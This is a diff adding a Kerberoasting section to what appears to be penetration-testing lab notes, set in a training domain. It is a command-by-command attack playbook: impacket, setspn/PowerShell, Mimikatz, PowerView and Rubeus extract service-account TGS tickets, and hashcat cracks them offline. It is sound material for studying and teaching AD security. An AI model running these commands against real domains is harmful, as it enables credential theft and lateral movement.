@@ -2566,6 +2566,60 @@ john --wordlist=rockyou.txt hash.txt
 
 > Sync clock with DC: `sudo ntpdate <DC_IP>`
 
+Is a lateral movement/privilege escalation technique in Active Directory. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account.
+
+Any domain user can request a Kerberos ticket for any service account in the same domain.
+
+All you need is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.
+
+- From a non-domain joined Linux host using valid domain user credentials.
+- From a domain-joined Linux host as root after retrieving the keytab file.
+- From a domain-joined Windows host authenticated as a domain user.
+- From a domain-joined Windows host with a shell in the context of a domain account.
+- As SYSTEM on a domain-joined Windows host.
+- From a non-domain joined Windows host using runas /netonly.
+
+TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.
+
+### From Linux — GetUserSPNs.py
+
+Install impacket: https://github.com/SecureAuthCorp/impacket
+
+```bash
+sudo python3 -m pip install .
+```
+
+Listing SPN Accounts:
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+```
+
+Requesting all TGS Tickets:
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+```
+
+Requesting a single ticket:
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+```
+
+Saving the TGS Ticket to an Output File:
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+```
+
+Cracking the ticket offline with hashcat:
+```bash
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+```
+
+Testing Authentication against a Domain Controller:
+```bash
+sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+```
+
+Basic usage:
 ```bash
 # Check for vulnerable accounts
 impacket-GetUserSPNs domain.htb/user:password
@@ -2578,7 +2632,92 @@ john -w:rockyou.txt hash
 hashcat -a 0 -m 13100 hash.txt rockyou.txt
 ```
 
-With Rubeus (from Windows):
+### From Windows — setspn.exe
+
+Enumerating SPNs:
+```powershell
+setspn.exe -Q */*
+```
+
+Target a single user:
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+- `Add-Type`: Is used to add a .NET framework class to our powershell session.
+- `-AssemblyName`: Allow us to indicate an assembly that contains types that we are intested in using
+- `System.IdentityModel`: Is a namespace that contains different classes for building security token services.
+- `New-Object`: Create a instance of .NET framework object.
+- `System.IdentityModel.Tokens and KerberosRequestorSecurityToken`: Allow us to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current login.
+
+Retrieving all tickets using setspn.exe:
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+### Extracting Tickets from Memory with Mimikatz
+
+Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.
+
+- `base64 /out:true`: If we don't identify this command, mimikatz will extract the tickets and write them to `.kirbi` files.
+- `kerberos::list /export`: Export all the tickets
+
+Preparing the base64 blob for cracking:
+```bash
+echo "<base64 blob>" |  tr -d \\n
+```
+
+Convert to .kirbi file:
+```bash
+cat encoded_file | base64 -d > sqldev.kirbi
+```
+
+kirbi2john.py:
+```bash
+python2.7 kirbi2john.py sqldev.kirbi
+```
+
+Modifying crack_file for Hashcat:
+```bash
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+```
+
+Cracking the hash with hashcat:
+```bash
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+```
+
+### Automated / Tool Based Routes (Windows)
+
+Enumerate the SPN accounts with PowerView:
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+
+PowerView to target a specific user:
+```powershell
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+
+Export all tickets to a CSV file:
+```powershell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+With Rubeus:
+```powershell
+.\Rubeus.exe kerberoast /stats
+```
+
+```powershell
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+We use `/nowrap` flag to copied the hash more easily for offline cracking.
+
+With Rubeus (basic):
 ```
 Rubeus.exe kerberoast /creduser:s4vicorp.local\user /credpassword:password
 ```
